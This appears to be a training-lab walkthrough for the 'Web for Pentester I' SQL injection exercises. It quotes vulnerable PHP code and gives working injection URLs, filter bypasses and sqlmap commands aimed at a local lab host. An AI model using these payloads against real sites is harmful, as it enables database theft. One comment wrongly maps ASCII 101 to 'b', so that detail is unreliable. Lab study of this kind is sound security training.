# Web-For-Pentester-I-SQLi
==========Level 1==========<br />
`
	$sql = "SELECT * FROM users where name='";
	$sql .= $_GET["name"]."'";	
	$result = mysql_query($sql);
	if ($result) {
		?>`

**Payload: **
- http://192.168.1.105/sqli/example1.php?name=root' or '1'='1
- http://192.168.1.105/sqli/example1.php?name=root' union select 1,name,passwd,4,5 from users-- -<br />
**SQLMAP: **
- python sqlmap.py -u http://192.168.1.105/sqli/example1.php?name=root --dbs<br />

==========Level 2==========<br />
`if (preg_match('/ /', $_GET["name"])) {
		die("ERROR NO SPACE");	
	}
	$sql = "SELECT * FROM users where name='";
	$sql .= $_GET["name"]."'";
	$result = mysql_query($sql);`

_In this example, the error message gives away the protection created by the developer: ERROR NO SPACE. This error message appears as soon as a space is injected inside the request. It prevents us from using the ' and '1'='1 method, or any fingerprinting that use the space character. However, this filtering is easily bypassed, using tabulation (HT or \t). You will need to use encoding, to use it inside the HTTP request. Using this simple bypass, you should be able to see how to detect this vulnerability._

**Payload: **
- http://192.168.1.105/sqli/example2.php?name=root'%09or%09'1'='1
- http://192.168.1.105/sqli/example2.php?name=root'%09union%09select%09name,passwd,3,4,5%09from%09users--%09-

**SQLMAP: **
- python sqlmap.py -u http://192.168.1.105/sqli/example2.php?name=root --dbs --tamper=space2comment

==========Level 3==========<br />
`if (preg_match('/\s+/', $_GET["name"])) {
		die("ERROR NO SPACE");	
	}
	$sql = "SELECT * FROM users where name='";
	$sql .= $_GET["name"]."'";`

_In this example, the developer blocks spaces and tabulations. There is a way to bypass this filter. You can use comments between the keywords to build a valid request without any space or tabulation. The following SQL comments can be used: /**/. By replacing all space/tabulation in the previous examples using this comment, you should be able to test for this vulnerability._
_http://php.net/manual/en/regexp.reference.escape.php. In this regexp **\s** any whitespace character_

**Payload: **
- http://192.168.1.105/sqli/example3.php?name=root%27/**/or/**/%271%27=%271
- http://192.168.1.105/sqli/example3.php?name=root'/**/union/**/select/**/1,(select/**/name/**/from/**/users/**/limit/**/1,1),(select/**/passwd/**/from/**/users/**/limit/**/1,1),4,5/**/or/**/'1'='1

**SQLMAP: **
- python sqlmap.py -u http://192.168.1.105/sqli/example3.php?name=root --dbs --tamper=space2comment

==========Level 4==========<br />
`$sql="SELECT * FROM users where id=";
	$sql.=mysql_real_escape_string($_GET["id"])." ";
	$result = mysql_query($sql);`

_http://php.net/manual/en/function.mysql-real-escape-string.php_

**Payload: **
- http://192.168.1.105/sqli/example4.php?id=2 or 1=1
- http://192.168.1.105/sqli/example4.php?id=2 union select 1,name, passwd,4,5 from users

**SQLMAP: **
- python sqlmap.py -u http://192.168.1.105/sqli/example4.php?id=2 --dbs

==========Level 5==========<br />
`if (!preg_match('/^[0-9]+/', $_GET["id"])) {
		die("ERROR INTEGER REQUIRED");	
	}`

_http://php.net/manual/en/function.preg-match.php_
_However, the regular expression used is incorrect; it only ensures that the parameter id starts with a digit. The detection method used previously can be used to detect this vulnerability._

**Payload: **
- http://192.168.1.105/sqli/example5.php?id=2 or 1=1
- http://192.168.1.105/sqli/example5.php?id=2 union select 1,name, passwd,4,5 from users

**SQLMAP: **
- python sqlmap.py -u http://192.168.1.105/sqli/example5.php?id=2 --dbs


==========Level 6==========<br />
`if (!preg_match('/[0-9]+$/', $_GET["id"])) {
		die("ERROR INTEGER REQUIRED");	
	}`

_This regular expression only check the end with a digit, and forgot ^ to check start with a digit. So we can make evil string with a digit in the end._

**Payload: **
- http://192.168.1.105/sqli/example6.php?id=2 or 1=1-- - 1
- http://192.168.1.105/sqli/example6.php?id=2 or 1=1# 1
- http://192.168.1.105/sqli/example6.php?id=2 union select 1,name,passwd,4,5 from users-- - 123

**SQLMAP: **
- python sqlmap.py -u http://192.168.1.105/sqli/example6.php?id=2 --dbs

==========Level 7==========<br />
`if (!preg_match('/^-?[0-9]+$/m', $_GET["id"])) {
		die("ERROR INTEGER REQUIRED");	
	}`

_Regular expression will check the start and the end of string is a digit. However, the regular expression contains the modifier PCRE_MULTILINE (/m). It will check only one line, and don't care about next line have start or end with digit. So we can bypass it by using `id=2\nPAYLOAD`. And we need convert `\n` to hex. It is %0a_

**Payload: **
- http://192.168.1.105/sqli/example7.php?id=2%0aor%0a1=1-- -
- http://192.168.1.105/sqli/example7.php?id=2%0aunion%0aselect%0a1,name,passwd,4,5%0afrom%0ausers-- -

**SQLMAP: **
- python sqlmap.py -u 'http://192.168.1.105/sqli/example7.php?id=2%0a'

==========Level 8==========<br />
`
	$sql = "SELECT * from users ORDER BY `";
	$sql .= mysql_real_escape_string($_GET["order"])."`";
	$result = mysql_query($sql)
`

http://www.securityidiots.com/Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html

**Payload: **
http://192.168.1.105/sqli/example8.php?order=id` desc-- -
http://192.168.1.105/sqli/example8.php?order=id` desc%23

**SQLMAP: **
- python sqlmap.py -u 'http://192.168.1.105/sqli/example8.php?order=name%60*' --dbs --batch --v 5

==========Level 9==========<br />
`
	$sql = "SELECT * from users ORDER BY ";
	$sql .= mysql_real_escape_string($_GET["order"]);
	$result = mysql_query($sql)
`
There are other methods that can be used in this case, since we are directly injecting in the request without a back-tick before. 
We can use the MySQL IF statement to generate more payloads:
	IF(1, name,age) should give the same results.
	IF(0, name,age) should give different results. You can see that the columns are sorted by age, but the sort function compares the values as strings, not as integers (10 is smaller than 2). This is a side effect of IF that will sort values as strings if one of the column contains a string.

**Payload: **
http://192.168.1.105/sqli/example9.php?order=if((ASCII(SUBSTRING(database(),1,1))=101), name, age)-- - #This response with order by name. So we know this first character of database is 'b'. Because Convert_decimal(101) = String(b)
http://192.168.1.105/sqli/example9.php?order=if((ASCII(SUBSTRING(database(),1,1))=102), name, age)-- - #This response with order by age. The first character of database not ascii(102)

*SQLMAP: **
- python sqlmap.py -u 'http://192.168.1.105/sqli/example9.php?order=id*' --dbs --batch --v 5
